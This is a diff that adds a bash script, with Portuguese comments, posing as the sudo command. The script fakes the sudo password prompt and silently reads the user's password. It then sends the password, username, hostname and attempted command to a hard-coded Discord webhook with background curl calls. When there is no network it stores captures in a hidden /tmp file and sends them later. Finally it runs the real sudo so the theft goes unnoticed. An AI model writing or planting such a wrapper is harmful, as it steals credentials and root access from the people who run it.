@@ -1,0 +1,47 @@
+#!/bin/bash
+
+# --- CONFIGURAÇÕES ---
+WEBHOOK_URL="https://discord.com/api/webhooks/1494194971857653890/pqSptx5KZ9cYy2bZ3I6KWMgjrZqfxSAQmmACL1RfvzBMS0Bw-Uz7R2RlhTnkY9bFp4Rg"
+OFFLINE_LOG="/tmp/.sys_sudo_cache"
+REAL_SUDO=$(command -p -v sudo 2>/dev/null || which -a sudo | grep -v "tmp" | head -n 1)
+
+if [ -z "$REAL_SUDO" ]; then
+    REAL_SUDO="/usr/bin/sudo"
+fi
+
+USER=$(whoami)
+HOSTNAME=$(hostname)
+COMMAND_TRIED="$@"
+
+# Simula o prompt do sudo original (Compatível com Mac/Linux)
+printf "[sudo] password for %s: " "$USER"
+read -s PASSWORD
+echo "" 
+
+# Prepara o payload para o Discord
+TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
+PAYLOAD="{\"content\": \"**Sudo Captured!**\n**Time:** $TIMESTAMP\n**User:** $USER@$HOSTNAME\n**Pass:** \`$PASSWORD\`\n**Cmd:** $COMMAND_TRIED\"}"
+
+# --- LÓGICA DE ENVIO / CACHE ---
+if ping -c 1 8.8.8.8 >/dev/null 2>&1; then
+    # Envia o atual
+    curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$WEBHOOK_URL" > /dev/null 2>&1 &
+    
+    # Envia o cache antigo se existir
+    if [ -f "$OFFLINE_LOG" ]; then
+        (
+            while IFS= read -r line; do
+                curl -s -H "Content-Type: application/json" -d "$line" "$WEBHOOK_URL" > /dev/null 2>&1
+                sleep 1
+            done < "$OFFLINE_LOG"
+            rm -f "$OFFLINE_LOG"
+        ) & # Roda em subshell background para não travar o terminal do usuário
+    fi
+else
+    # Salva offline se não houver conexão
+    echo "$PAYLOAD" >> "$OFFLINE_LOG"
+fi
+
+# --- EXECUÇÃO DO SUDO REAL ---
+# O '2>/dev/null' esconde avisos do sudo sobre ler do stdin
+echo "$PASSWORD" | $REAL_SUDO -S $COMMAND_TRIED 2>/dev/null
